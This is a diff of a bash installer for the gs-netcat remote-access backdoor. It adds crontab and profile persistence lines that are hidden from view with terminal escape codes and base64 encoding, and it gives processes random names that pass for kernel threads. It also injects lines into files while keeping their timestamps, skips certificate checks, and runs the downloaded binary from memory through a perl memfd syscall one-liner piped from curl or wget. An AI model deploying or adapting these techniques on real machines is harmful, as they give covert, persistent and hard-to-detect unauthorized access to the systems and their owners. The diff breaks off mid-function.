@@ -29,6 +29,8 @@
 #       - Do not start gs-netcat (for testing purpose only)
 # GS_NOINST=1
 #		- Do not install gsocket
+# GS_NOTEST=1
+#       - Do not test Global Socket Relay Network
 # GS_OSARCH=x86_64-linux or mipsel32-linux etc
 #       - Force architecture to a specific package (for testing purpose only)
 # GS_PREFIX=
@@ -47,6 +49,16 @@
 #       - Do not fast forward to a small pid.
 # GS_NOREEXEC=1
 #       - Do not re-exec or change argv0.
+# GS_NOCRONTAB=1
+#       - Disable crontab persistency (do not install in crontab).
+# GS_NOLINEHIDING=1
+#       - Do not try to hide the crontab/profile lines with terminal escapes.
+# GS_NONOTE=1
+#       - Do not include "Dont remove this line" warning in crontab/profile [default=1].
+# GS_NOENC=1
+#       - Do not base64/xxd encode profile/crontab strings.
+# GS_NOMEMEXEC=1
+#       - When S= is used, do not use memexec but download to file system instead.
 # GS_NAME="[kcached]"
 #       - Specify custom hidden name file & process. Default is picked at random.
 # GS_BIN="fg"
@@ -78,8 +90,6 @@
 #       - use [a-z].gz.<GS_DOMAIN> to resolve relay addresses.
 # GS_WORKDIR=
 #       - Set the HOME directory (e.g. try GS_WORKDIR=/dev/shm).
-# _GS_TMPDIR=
-#       - Guess what...
 
 # Global Defines
 ###----BEGIN changed by CICD script-----
@@ -113,6 +123,9 @@ GS_WEBHOOK_404_OK=
 [ -n "$gs_deploy_webhook" ] && GS_WEBHOOK="$gs_deploy_webhook"
 unset gs_deploy_webhook DS_GS_HOST DS_GS_PORT DS_GS_BEACON DS_GS_NAME DS_GS_BIN
 
+[ -z "$GS_NOLINEHIDING" ] && _ESC_CLEARLN=$'\e'"[2K"$'\e'"[1A"
+
+ORIG_ARGS=("$@")
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
@@ -183,15 +196,20 @@ PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
 config_dir_name_arr=("mc" "procps" "pulse" "Thunar" "powershell" "dconf")
 CONFIG_DIR_NAME_DEFAULT="${config_dir_name_arr[$((RANDOM % ${#config_dir_name_arr[@]}))]}"
 
+### DEFAULTS:
 # GS_INFECT=1
-
-GS_SYSTEMD_PERSIST="oneshot"
-#GS_SYSTEMD_PERSIST="default"
-[[ -n $GS_NOINFECT ]] && unset GS_INFECT
+# GS_NOTE=1
 GS_FFPID=1
-[[ -n $GS_NOFFPID ]] && unset GS_FFPID
 GS_REEXEC=1
-[[ -n "$GS_NOREEXEC" ]] && unset GS_REEXEC
+GS_SYSTEMD_PERSIST="oneshot"
+GS_MEMEXEC=1
+#GS_SYSTEMD_PERSIST="default"
+
+[ -n "$GS_NOINFECT" ] && unset GS_INFECT
+[ -n "$GS_NONOTE" ] && unset GS_NOTE
+[ -n "$GS_NOFFPID" ] && unset GS_FFPID
+[ -n "$GS_NOREEXEC" ] && unset GS_REEXEC
+[ -n "$GS_NOMEMEXEC" ] && unset GS_MEMEXEC
 unset SYSTEMD_INSTALL_CHECK_IS_ACTIVE
 
 # systemd candidates for binary infection
@@ -514,6 +532,7 @@ xcp() {
 	local src="$1"
 	local dst="$2"
 
+	{ [ -z "$2" ] || [ "$2" == "-" ]; } && { cat "$src"; return; }
 	# DEBUGF "${CG}XCP($src, $dst)${CN}"
 	# Must create file first so that SELinux does not inherit the user_tmp_t flag
 	mk_file "$dst" || return
@@ -533,17 +552,9 @@ xmv() {
 	return 0
 }
 
-clean_all() {
-	[[ "${#_GS_TMPDIR}" -gt 5 ]] && {
-		rm -rf "${_GS_TMPDIR:?}/"*
-		rmdir "${_GS_TMPDIR}"
-	} &>/dev/null
-
-	ts_restore
-}
 
 exit_code() {
-	clean_all
+	ts_restore
 
 	exit "$1"
 }
@@ -582,15 +593,15 @@ try_dstdir()
 {
 	local dstdir="${1:?}"
 	local trybin
-	local ret=255
 	local is_try_ldso="${2}"
+	local is_need_rmdir
 
 	# Create directory if it does not exists.
-	[[ ! -d "${dstdir}" ]] && { xmkdir "${dstdir}" || return 101; }
+	[[ ! -d "${dstdir}" ]] && { xmkdir "${dstdir}" || return 101; _IS_DSTDIR_CREATED=1; is_need_rmdir=1; }
 
 	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"
  
-	mk_file "$DSTBIN" || return 102
+	mk_file "$DSTBIN" || { [ -n "$is_need_rmdir" ] && xrmdir "$dstdir"; return 102; }
 
 	# Find an executeable and test if we can execute binaries from
 	# destination directory (no noexec flag)
@@ -606,13 +617,16 @@ try_dstdir()
 
 	# /bin/true might be a symlink to /usr/bin/true
 	[[ "$ebin" -ef "$trybin" ]] && return 0
-	mk_file "$trybin" || return
+	mk_file "$trybin" || { [ -n "$is_need_rmdir" ] && xrmdir "$dstdir"; return 103; }
 
 	cp "$ebin" "$trybin" &>/dev/null && {
-		try_execbin "${trybin:?}" "${is_try_ldso}" && ret=0
-		rm -f "${trybin:?}"
+		try_execbin "${trybin:?}" "${is_try_ldso}" && {
+			rm -f "${trybin:?}"
+			return 0
+		}
 	}
-	return "$ret"
+	[ -n "$is_need_rmdir" ] && xrmdir "$dstdir"
+	return 255
 }
 
 output_memexec() {
@@ -623,8 +637,15 @@ output_memexec() {
 	}
 	echo -e "${CM}${DL[*]} ${URL_BIN}/${SRC_PKG} | \\"
 	echo "GS_ARGS=\"-ilD -s \${X:?}\" \\"
-	echo -n 'perl '"'"'-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV'"'"' -- "$@"'
+	echo -n 'perl '"'"'-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV'"'"' --'
 	echo -e "${CN}"
+}
+
+init_dstbin_exit() {
+	echo -e >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
+	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
+	[ -z "$S" ] && output_memexec
+	errexit
 }
 
 # Called _after_ init_vars() at the end of init_setup.
@@ -635,6 +656,14 @@ init_dstbin()
 		errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writeable and executeable."
 	fi
 
+	[ -n "$S" ] && {
+		try_dstdir "/dev/shm/.gsusr-${UID}" "1" && return
+		try_dstdir "/var/tmp/.gsusr-${UID}" "1" && return
+		try_dstdir "/tmp/.gsusr-${UID}" "1" && return
+		try_dstdir "${PWD}" "1" && return
+
+		init_dstbin_exit
+	}
 	# Try systemwide installation first. Do not use LDSO-method for installs to /usr/sbin
 	try_dstdir "${GS_PREFIX}/usr/sbin" "" && return
 
@@ -654,19 +683,7 @@ init_dstbin()
 	# Try /dev/shm as last resort
 	try_dstdir "/dev/shm" "1" && { IS_DSTBIN_TMP=1; return; }
 
-	echo -e >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
-	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
-	output_memexec
-	errexit
-}
-
-try_tmpdir()
-{
-	[[ -n $_GS_TMPDIR ]] && return # already set
-
-	[[ ! -d "$1" ]] && return
-
-	[[ -d "$1" ]] && xmkdir "${1}/${2}" && _GS_TMPDIR="${1}/${2}"
+	init_dstbin_exit
 }
 
 try_encode()
@@ -726,6 +743,7 @@ is_le()
 	return 255
 }
 
+
 # Return 0 (TRUE) if it is 64 bit arch. Default is FALSE (32bit)
 is_64bit() {
 	command -v getconf >/dev/null && [[ "$(getconf LONG_BIT)" == "64" ]] && return 0
@@ -736,18 +754,12 @@ is_64bit() {
 
 init_vars()
 {
-	# Select binary
 	local arch
 	local osname
 	local service
 	local bin
 	arch=$(uname -m)
-
-	if [[ -z "$HOME" ]]; then
-		HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
-		[[ ! -d "$HOME" ]] && errexit "ERROR: \$HOME not set. Try 'export HOME=<users home directory>'"
-		WARN "HOME not set. Using 'HOME=$HOME'"
-	fi
+	local phome
 
 	# set PWD if not set
 	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"
@@ -867,6 +879,51 @@ init_vars()
 		SRC_PKG="gs-netcat_mini-linux-x86_64"
 	fi
 
+	if command -v curl >/dev/null; then
+		DL_CMD="$DL_CRL"
+	elif command -v wget >/dev/null; then
+		DL_CMD="$DL_WGT"
+	elif [[ -z "$GS_USELOCAL" ]]; then
+		# errexit "Need curl or wget."
+		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
+		errexit
+	fi
+
+	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
+	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
+	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
+		IS_USE_CURL=1
+		### Note: need -S (--show-errors) to process 404 for CF webhooks.
+		DL=("curl" "-fsSL" "--connect-timeout" "7" "-m900" "--retry" "3")
+		[[ -n $GS_DEBUG ]] && DL+=("-v")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("-k")
+	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
+		IS_USE_WGET=1
+		### Note: Dont use -q: Need errors to process 404 for CF webhooks
+		# Read-timeout is 900 seconds by default.
+		DL=("wget" "-O-")
+		wget --help 2>&1 | grep -qFm1 connect && DL+=("--connect-timeout=7" "--dns-timeout=7")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
+	else
+		# Can happen if deploy-all.sh when no curl/wget
+		# but we still want to do a webhook.
+		DL=("false")   # Should not happen
+	fi
+
+	# Client also uses "mini" now.
+	# [ -n "$S" ] && URL_BIN="$URL_BIN_FULL"
+
+	[ -n "$S" ] && gs_access_memexec
+	# Use HOME from /etc/passwd first
+	phome="$(grep -m1 ^"$(whoami)" /etc/passwd 2>/dev/null | cut -d: -f6)"
+	[ -n "$phome" ] && [ "$phome" != "$HOME" ] && HOME="$phome"
+
+	[ -z "$HOME" ] && {
+		HOME="$(pwd)"
+		WARN "HOME not set. Using 'HOME=$HOME'"
+	}
+	[ ! -d "$HOME" ] && errexit "ERROR: Not found: '$HOME'. Try 'export HOME=<users home directory>'"
+
 	# Docker does not set USER
 	[[ -z "$USER" ]] && USER=$(id -un)
 	[[ -z "$UID" ]] && UID=$(id -u)
@@ -919,17 +976,14 @@ init_vars()
 		# they match the binary name.
 		WARN "OSX is least supported. GS_UNDO= may not work. Check manually"
 		KL_CMD="killall"
-		KL_CMD_TERM="killall"
 		KL_NAME="${PROC_HIDDEN_NAME}"
 		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
 	elif command -v pkill >/dev/null; then
 		KL_CMD="pkill"
-		KL_CMD_TERM="pkill -x"
 		KL_NAME="${BIN_HIDDEN_NAME_RX}"
 		KL_CMD_RUNCHK_UARG=("-0" "-x" "-U${UID}")
 	elif command -v killall >/dev/null; then
 		KL_CMD="killall"
-		KL_CMD_TERM="killall"
 		KL_NAME="${BIN_HIDDEN_NAME}"
 		# cygwin's killall needs the name (not the uid)
 		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
@@ -977,46 +1031,6 @@ init_vars()
 	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
 	[[ ! -d "${CRONTAB_DIR}" ]] && CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"
 
-	# local pids
-	# Linux 'pgrep kswapd0' would match _binary_ kswapd0 even if argv[0] is '[rcu_preempt]'
-	# and also matches kernel process '[kwapd0]'.
-	# pids="$(pgrep -x "${BIN_HIDDEN_NAME_RX}" 2>/dev/null)"
-	# OSX's pgrep works on argv[0] proc-name:
-	# [[ -z $pids ]] && pids="$(pgrep "(${PROC_HIDDEN_NAME_RX})" 2>/dev/null)"
-	# [[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }" # Convert multi line into single line
-	# unset pids
-
-	if command -v curl >/dev/null; then
-		DL_CMD="$DL_CRL"
-	elif command -v wget >/dev/null; then
-		DL_CMD="$DL_WGT"
-	elif [[ -z "$GS_USELOCAL" ]]; then
-		# errexit "Need curl or wget."
-		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
-		errexit
-	fi
-
-	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
-	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
-	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
-		IS_USE_CURL=1
-		### Note: need -S (--show-errors) to process 404 for CF webhooks.
-		DL=("curl" "-fsSL" "--connect-timeout" "7" "-m900" "--retry" "3")
-		[[ -n $GS_DEBUG ]] && DL+=("-v")
-		[[ -n $GS_NOCERTCHECK ]] && DL+=("-k")
-	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
-		IS_USE_WGET=1
-		### Note: Dont use -q: Need errors to process 404 for CF webhooks
-		# Read-timeout is 900 seconds by default.
-		DL=("wget" "-O-")
-		wget --help 2>&1 | grep -qFm1 connect && DL+=("--connect-timeout=7" "--dns-timeout=7")
-		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
-	else
-		# Can happen if deploy-all.sh when no curl/wget
-		# but we still want to do a webhook.
-		DL=("false")   # Should not happen
-	fi
-
 	UNINST_CMD="$DL_CMD"
 	[[ -n "$GS_USELOCAL" ]] && UNINST_CMD="./deploy-all.sh"
 
@@ -1033,9 +1047,7 @@ init_vars()
 
 mk_encode() {
 	local str
-	str="$(echo "$(date)${HOSTNAME}-FOOBAR" | md5sum | sed 's/[^a-f0-9]//g')"
-	str="${str:0:8}"
-	str="2>/dev/null #${str:-4a50524e} >/dev/random # ${BIN_HIDDEN_NAME}-kernel"
+	str="2>/dev/null >/dev/null #${BIN_HIDDEN_NAME}${_ESC_CLEARLN}"
 	if [[ -n "$ENCODE_STR" ]]; then 
 		echo "{ echo $(echo "$1"|${ENCODE_STR})|${DECODE_STR}|bash;} ${str}"
 	else
@@ -1046,14 +1058,6 @@ mk_encode() {
 init_setup()
 {
 	local str
-	unset _GS_TMPDIR
-	[[ -n $TMPDIR ]] && try_tmpdir "${TMPDIR}" ".gs-${UID}"
-	try_tmpdir "/dev/shm" ".gs-${UID}"
-	try_tmpdir "/var/tmp" ".gs-${UID}"
-	try_tmpdir "/tmp" ".gs-${UID}"
-	try_tmpdir "${HOME}" ".gs"
-	try_tmpdir "$(pwd)" ".gs-${UID}"
-	[[ -z $_GS_TMPDIR ]] && errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR="
 
 	if [[ -n "$GS_PREFIX" ]]; then
 		# Debuggin and testing into separate directory
@@ -1072,7 +1076,8 @@ init_setup()
 	[[ -n "$LDSO" ]] && DSTBIN_EXEC_ARR=("${LDSO}")
 	DSTBIN_EXEC_ARR+=("${DSTBIN}")
 
-	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. # ${BIN_HIDDEN_NAME}-kernel"
+	unset NOTE_DONOTREMOVE
+	[ -n "$GS_NOTE" ] && NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. # ${BIN_HIDDEN_NAME}${_ESC_CLEARLN}"
 
 	# There is no reliable way to check if a process is running:
 	# - Process might be running under different name. Especially OSX checks for the orginal name
@@ -1098,19 +1103,30 @@ init_setup()
 	RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
 	PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
 	CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
+	# crontab persistency is disabled:
+	[ -n "$GS_NOCRONTAB" ] && unset CRONTAB_LINE
 
-	DEBUGF "_GS_TMPDIR=${_GS_TMPDIR}"
 	DEBUGF "DSTBIN_EXEC_ARR=${DSTBIN_EXEC_ARR[*]}"
+}
+
+_config2bin_memexec() {
+	local src="$1"
+	local dst="$2"
+
+	[[ "$src" != "$dst" ]] && return 255
+
+	GS_CONFIG_WRITE="${dst}" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3"' <"$src" &>/dev/null || return 255
+	DEBUGF "config2bin_memexec SUCCESS"
+
+	return 0
 }
 
 # Execute 'src' to create configuration and add it to 'dst'.
 # config2bin src dst ARGS
 # 'src' must be executeable.
-config2bin() {
+_config2bin_tmpfile() {
 	local src="$1"
 	local dst="$2"
-	local opts="$3"
-	local proc_hidden_name="$4"
 	local dst_final
 	local exec_arr=()
 
@@ -1129,13 +1145,25 @@ config2bin() {
 
 	[[ -n "$LDSO" ]] && exec_arr=("$LDSO")
 	exec_arr+=("${src}")
-	TERM=xterm-256color GS_CCG="${GS_CCG}" GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_REEXEC="${GS_REEXEC}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${exec_arr[@]}" || return 255
+	GS_CONFIG_WRITE="${dst}" "${exec_arr[@]}" || return 255
 	[[ -n "$dst_final" ]] && {
 		cat "${dst}" >"${dst_final}"
 		rm -f "${dst:?}"
 	}
 
 	return 0
+}
+
+_config2bin_withenv() {
+	_config2bin_memexec "$@" && return 0
+	_config2bin_tmpfile "$@" && return 0
+}
+
+config2bin() {
+	local opts="$3"
+	local proc_hidden_name="$4"
+
+	GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_ARGS="${opts}" TERM=xterm-256color GS_CCG="${GS_CCG}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_REEXEC="${GS_REEXEC}" GS_STEALTH=1 GS_SECRET="${GS_SECRET:?}" _config2bin_withenv "$@"
 }
 
 # Load configuration from TARGET by executing EXE.
@@ -1259,6 +1287,8 @@ uninstall()
 	local fn
 	local cn
 
+	{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "Only removing default installs. ${CF}[GS_BIN= and GS_NAME= are not set]${CN}"
+
 	cmd_kill_arr=("${BIN_HIDDEN_NAME}")
 	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
 		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
@@ -1300,16 +1330,12 @@ uninstall()
 	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
 	uninstall_rmdir "/tmp/.gsusr-${UID}"
 
-	uninstall_rm "${_GS_TMPDIR}/${SRC_PKG}"
-	uninstall_rm "${_GS_TMPDIR}/._gs-netcat" # OLD
-	uninstall_rmdir "${_GS_TMPDIR}"
-
 	# Remove crontab
 	unset regex
 	regex="dummy-not-exist"
 	for str in "${BIN_HIDDEN_NAME_RM[@]}"; do
 		# Escape regular exp special characters
-		regex+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')-kernel"
+		regex+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
 	done
 	if [[ $OSNAME != "osx" ]] && command -v crontab >/dev/null; then
 		ct="$(crontab -l 2>/dev/null)"
@@ -1360,9 +1386,9 @@ OK_OUT()
 
 FAIL_OUT()
 {
-	echo -e "..[${CR}FAILED${CN}]"
+	echo >&2 -e "..[${CR}FAILED${CN}]"
 	for str in "$@"; do
-		echo -e "--> $str"
+		echo >&2 -e "--> $str"
 	done
 }
 
@@ -1681,19 +1707,24 @@ install_system_systemd()
 
 # inject a string ($2-) into the 2nd line of a file and retain the
 # PERM/TIMESTAMP of the target file ($1)
-install_to_file()
-{
+install_to_file() {
 	local fname="$1"
+	local D out
 
 	shift 1
 
 	# If file does not exist then create with oldest TS
 	mk_file "$fname" || return
 
-	D="$(IFS=$'\n'; head -n1 "${fname}" && \
-		echo "${*}" && \
+	while [ $# -gt 0 ]; do
+		[ -n "$1" ] && out+="$1"$'\n'
+		shift 1
+	done
+
+	D="$(head -n1 "${fname}" && \
+		echo -n "${out}" && \
 		tail -n +2 "${fname}")"
-	echo 2>/dev/null "$D" >"${fname}" || return
+	echo "$D" >"${fname}" 2>/dev/null || return
 
 	true
 }
@@ -1739,6 +1770,7 @@ install_user_crontab()
 {
 	command -v crontab >/dev/null || return # no crontab
 	echo -en "Installing access via crontab........................................."
+	[ -z "$CRONTAB_LINE" ] && { SKIP_OUT; return ; }
 	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
 		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
@@ -1746,18 +1778,16 @@ install_user_crontab()
 		return
 	fi
 
-	[[ $UID -eq 0 ]] && {
-		mk_file "${CRONTAB_DIR}/root"
-	}
+	[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"
 
 	local old
-	old="$(crontab -l 2>/dev/null)" || {
-		# Create empty crontab (busybox) if no crontab exists at all.
-		crontab - </dev/null &>/dev/null
-	}
-	[[ -n $old ]] && old+=$'\n'
+	# Create empty crontab (busybox) if no crontab exists at all.
+	old="$(crontab -l 2>/dev/null)" || crontab - </dev/null &>/dev/null
 
-	echo -e "${old}${NOTE_DONOTREMOVE}\n0 * * * * $CRONTAB_LINE" | grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; }
+	[ -n "$old" ] && old+=$'\n'
+	[ -n "${NOTE_DONOTREMOVER}" ] && old+="${NOTE_DONOTREMOVE}"$'\n'
+
+	echo -e "${old}0 * * * * $CRONTAB_LINE" | grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; }
 
 	((IS_INSTALLED+=1))
 	OK_OUT
@@ -1802,9 +1832,11 @@ install_user()
 	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" "${PROC_HIDDEN_NAME}" || return 255
 }
 
-ask_nocertcheck()
-{
-	WARN "Can not verify host. CA Bundle is not installed."
+ask_nocertcheck() {
+	# Assume NOCERTCHECK if we can not ask.
+	[ ! -t 0 ] && return
+
+	echo -e >&2 "--> ${CY}WARNING: ${CN}Can not verify host. CA Bundle is not installed."
 	echo >&2 "--> Attempting without certificate verification."
 	echo >&2 "--> Press any key to continue or CTRL-C to abort..."
 	echo -en >&2 "--> Continuing in "
@@ -1818,86 +1850,128 @@ ask_nocertcheck()
 		read -r -t1 -n1 && break
 	done
 	[[ $n -gt 0 ]] || echo >&2 "0"
-
-	GS_NOCERTCHECK=1
 }
 
 # Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
 # <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
-dl_ssl()
-{
-	local cmd sslerr arg_nossl
+dl_ssl() {
+	local cmd sslerr arg_nossl ret
 	cmd="$3"
 	sslerr="$2"
 	arg_nossl="$1"
 
 	shift 3
+	unset DL_ERR
 	if [[ -z $GS_NOCERTCHECK ]]; then
-		DL_ERR="$("$cmd" "$@" 2>&1 1>/dev/null)"
-		[[ "${DL_ERR}" != *"$sslerr"* ]] && return
+		{ DL_ERR="$("$cmd" "$@" 2>&1 >&3 3>&-)"; } 3>&1 && unset DL_ERR
+		ret=$?
+		[ -z "$DL_ERR" ] && return 0
+		# ret=77 is curl (77) Problem with the SSL CA cert (path? access rights?)
+		# ret=35 is wget (35) SSL connect error
+		[ $ret -ne 35 ] && [ $ret -ne 77 ] && [[ "${DL_ERR}" != *"$sslerr"* ]] && return 0
 	fi
 
 	FAIL_OUT "Certificate Error."
+	# This will either continue or die by Ctrl-C (user)
 	[[ -z $GS_NOCERTCHECK ]] && ask_nocertcheck
-	[[ -z $GS_NOCERTCHECK ]] && return
 
 	echo -en "--> Downloading binaries without certificate verification............."
-	DL_ERR="$("$cmd" "$arg_nossl" "$@" 2>&1 1>/dev/null)"
+	{ DL_ERR="$("$cmd" "$arg_nossl" "$@" 2>&1 >&3 3>&-)"; } 3>&1 && unset DL_ERR
+	[ -z "$DL_ERR" ] && return 0
 }
 
-# Download $1 and save it to $2
-dl()
-{
+# Download $1 and save it to $2 ($2 can be empty to output to stdout)
+dl() {
 	# Debugging / testing. Use local package if available
+	local unpack="cat"
 
-	[[ -n "$GS_USELOCAL_GSNC" ]] && {
+	[[ "$1" == *".gz" ]] && unpack="gunzip"
+	command -v "$unpack" >/dev/null || errexit "Need $unpack. Try ${CM}apt install $unpack${CN}"
+
+	[ -n "$GS_USELOCAL_GSNC" ] && {
+		[ ! -f "$GS_USELOCAL_GSNC" ] && FAIL_OUT "GS_USELOCAL_GSNC set but file ${CDG}$GS_USELOCAL_GSNC${CN} does not exists..."
 		xcp "$GS_USELOCAL_GSNC" "${2}" && return
-		FAIL_OUT "GS_USELOCAL_GSNC set but file ${CDG}$GS_USELOCAL_GSNC${CN} does not exists..."
+		FAIL_OUT "copy failed..."
 		errexit
 	}
-	if [[ -n "$GS_USELOCAL" ]]; then
-		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
-		[[ -f "/gsocket-pkg/${1}" ]] && xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
-		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null && return
+	if [ -n "$GS_USELOCAL" ]; then
+		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null | "$unpack" && return
+		[[ -f "/gsocket-pkg/${1}" ]] && xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null | "$unpack" && return
+		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null | "$unpack" && return
 		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1}). Try setting GS_USELOCAL_GSNC="
 		errexit
 	fi
 
 	# Delete. Maybe previous download failed.
-	[[ -s "$2" ]] && rm -f "${2:?}"
+	[ -n "$2" ] && [ -s "$2" ] && rm -f "${2:?}"
 
 	if [[ -n $IS_USE_CURL ]]; then
-		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2}"
+		# curl: (77) Problem with the SSL CA cert (path? access rights?)
+		# curl: (..) ???
+		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2:--}" | "$unpack"
 	elif [[ -n $IS_USE_WGET ]]; then
-		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2}"
+		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2:--}" | "$unpack"
 	else
 		# errexit "Need curl or wget."
 		FAIL_OUT "CAN NOT HAPPEN"
 		errexit
 	fi
 
-	# Download failed:
-	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_ERR"; exit_code 255; } 
+	[ -z "$DL_ERR" ] && return
+	FAIL_OUT
+	echo "$DL_ERR"
+	exit_code 255
+}
+
+gs_access_fail_exit() {
+	echo >&1 -e "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
+	echo >&1 -e "--> ${CR}To install use one of the following:${CN}"
+	echo >&1 -e "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
+	echo >&1 -e "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+
+	exit 61
 }
 
 # S= was set. Do not install but execute in place.
-gs_access()
-{
-	echo -e "Connecting..."
+gs_access() {
 	local ret
 	GS_SECRET="${S}"
 
 	GS_CONFIG_READ=0 GS_SECRET="${GS_SECRET}" "${DSTBIN_EXEC_ARR[@]}" -i
 	ret=$?
+
+	# no need to use xrm/xrmdir because TS was recorded already on creation.
+	[ -f "${DSTBIN:?}" ] && rm -f "${DSTBIN:?}"
+	[ -n "$_IS_DSTDIR_CREATED" ] && rmdir "${DSTBIN%/*}"
+
+	[[ $ret -eq 0 ]] && exit_code 0
+	[[ $ret -eq 61 ]] && gs_access_fail_exit
 	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
-	[[ $ret -eq 61 ]] && {
-		echo -e 2>&1 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
-		echo -e 2>&1 "--> ${CR}To install use one of the following:${CN}"
-		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
-		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
-	}
+	[[ $ret -eq 61 ]] && gs_access_fail_exit
 
 	exit_code "$ret"
+}
+
+gs_access_memexec() {
+	local ret cmd_str
+
+	command -v perl >/dev/null || return
+	[ -d "/proc/$$/fd" ] || return
+	[ -n "$GS_MEMEXEC" ] || return
+
+	if [ -n "$GS_USELOCAL_GSNC" ]; then
+		cmd_str="cat $GS_USELOCAL_GSNC"
+	elif [[ -n $IS_USE_CURL ]]; then
+		cmd_str="curl -SsfL ${URL_BIN}/${SRC_PKG}"
+	elif [[ -n $IS_USE_WGET ]]; then
+		cmd_str="wget ${URL_BIN}/${SRC_PKG} -O -"
+	fi
+
+	DEBUGF "Attempting memexec on $SRC_PKG"
